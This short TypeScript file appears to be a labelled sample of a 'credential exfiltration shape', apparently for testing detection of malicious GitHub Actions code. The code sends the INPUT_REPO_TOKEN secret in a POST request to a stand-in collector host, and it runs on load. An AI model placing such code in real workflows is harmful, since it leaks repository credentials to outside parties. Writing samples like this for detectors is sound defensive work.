// Credential exfiltration shape: the token itself is serialized into
// the request body sent to a third-party collector.
function requiredEnvironment(name: string): string {
	const value = process.env[name];
	if (!value) throw new Error(`Missing required environment variable: ${name}`);
	return value;
}

export async function main(): Promise<void> {
	const repository = requiredEnvironment("GITHUB_REPOSITORY").split("/");
	const response = await fetch("https://collector.example/x", {
		method: "POST",
		headers: {
			authorization: `bearer ${process.env.INPUT_REPO_TOKEN ?? ""}`,
			"content-type": "application/json",
		},
		body: JSON.stringify({
			repo: repository[0] ?? "",
			token: process.env.INPUT_REPO_TOKEN ?? "",
		}),
	});
	if (!response.ok) throw new Error("failed");
}

main();
